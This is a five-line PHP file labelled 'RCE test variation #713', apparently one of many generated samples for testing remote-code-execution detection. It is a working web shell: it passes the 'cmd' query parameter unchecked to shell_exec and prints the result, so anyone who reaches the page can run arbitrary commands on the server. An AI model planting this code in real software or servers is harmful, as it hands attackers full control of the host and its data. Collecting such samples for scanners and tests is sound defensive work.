<?php
// RCE test variation #713
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>